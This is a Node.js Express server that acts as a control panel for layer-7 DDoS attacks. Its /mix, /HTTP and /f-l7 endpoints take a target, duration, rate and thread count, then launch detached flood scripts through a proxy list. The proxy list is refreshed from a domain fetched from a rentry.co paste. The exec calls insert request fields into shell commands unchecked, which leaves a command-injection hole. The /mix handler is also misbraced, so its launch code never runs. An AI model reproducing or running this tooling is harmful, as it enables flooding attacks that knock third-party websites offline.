const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const app = express();
const port = 8080;
app.use(express.json());


app.get('/', (req, res) => {
  res.redirect('/status');
});
app.get('/status', (req, res) => {
  res.json({
    status: 'active',
    available: {
      'HTTP-BYPASS': '/HTTP',
      'MIX': '/mix',
      'Flood': '/f-l7'
    }
  });
});
function genId() {
    const prefix = 'sir#';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let randomString = '';

    for (let i = 0; i < 3; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        randomString += characters[randomIndex];
    }      
    return prefix + randomString;
}

let mainDomain;
async function fetchMainDomain() {
  try {
    const response = await axios.get('https://rentry.co/sirgateyttaanjay/raw');
    mainDomain = response.data.trim();
    console.log(`Main domain fetched: ${mainDomain}`);
  } catch (error) {
    console.error('Error fetching main domain:', error.message);
  }
}

async function updateProxies() {
  try {
    if (!mainDomain) {
      console.error('Main domain not set');
      return;
    }
    const proxyUrl = `http://${mainDomain}/http`;
    const response = await axios.get(proxyUrl);
    const proxies = response.data.trim();
    if (fs.existsSync('proxy.txt')) {
      fs.unlinkSync('proxy.txt');
    }
    fs.writeFileSync('proxy.txt', proxies, 'utf8');
    console.log('Proxies updated and saved to proxy.txt');
  } catch (error) {
    console.error('Error updating proxies:', error.message);
  }
}

// MIX || Mixed Method Tls and Http-0
app.post('/mix', (req, res) => {
  const { target, time, rate, threads } = req.body;
  if (!target || !time || !rate || !threads) {
    return res.status(404).json({ 
      error: 'Missing required parameters', 
      example: {
        target: 'https://example.com',
        time: '30',
        rate: '3300',
        threads: '5'
      }
    });
  const idScreen = genId()
  exec(`screen -S ${idScreen} -dm node L7/MIX.js ${target} ${time} ${rate} ${threads} ./proxy.txt`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return res.status(500).json({ error: error.message });
    }
    if (stderr) {
      console.error(`Stderr: ${stderr}`);
      return res.status(500).json({ error: stderr });
    }
    console.log({ message: 'MIX ATTACK executed', target, time, rate, threads, idScreen });
    res.json({ message: 'MIX ATTACK executed', target, time, rate, threads, idScreen });
  });
  }
})

// HTTP || Sending big amount Http packet + Bypassed
app.post('/HTTP', (req, res) => {
  const { target, time, rate, threads } = req.body;
  if (!target || !time || !rate || !threads) {
    return res.status(404).json({ 
      error: 'Missing required parameters', 
      example: {
        target: 'https://example.com',
        time: '30',
        rate: '3300',
        threads: '5'
      }
    });
  }
  const idScreen = genId()
  exec(`screen -S ${idScreen} -dm node L7/HTTP.js ${target} ${time} ${rate} ${threads} ./proxy.txt KEY_JS`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return res.status(500).json({ error: error.message });
    }
    if (stderr) {
      console.error(`Stderr: ${stderr}`);
      return res.status(500).json({ error: stderr });
    }
    console.log({ message: 'HTTP executed', target, time, rate, threads, idScreen });
    res.json({ message: 'HTTP executed', target, time, rate, threads, idScreen });
  });
});

// f-l7 || Flooding Web L7 With Big Http Headers
app.post('/f-l7', (req, res) => {
  const { target, time, threads, ratelimit } = req.body;
  if (!target || !time || !threads || !ratelimit) {
    return res.status(404).json({ 
      error: 'Missing required parameters', 
      example: {
        target: 'https://example.com',
        time: '30',
        threads: '3',
        ratelimit: '55000'
      }
    });
  }
  const idScreen = genId()
  exec(`screen -S ${idScreen} -dm node L7/FLOODER.js GET ${target} ${time} ${threads} ${ratelimit} ./proxy.txt`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return res.status(500).json({ error: error.message });
    }
    if (stderr) {
      console.error(`Stderr: ${stderr}`);
      return res.status(500).json({ error: stderr });
    }
    console.log({ message: 'Flooder executed', target, time, threads, ratelimit, idScreen });
    res.json({ message: 'Flooder executed', target, time, threads, ratelimit, idScreen });
  });
});

fetchMainDomain().then(() => {
  setInterval(updateProxies, 180000);
  updateProxies();
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});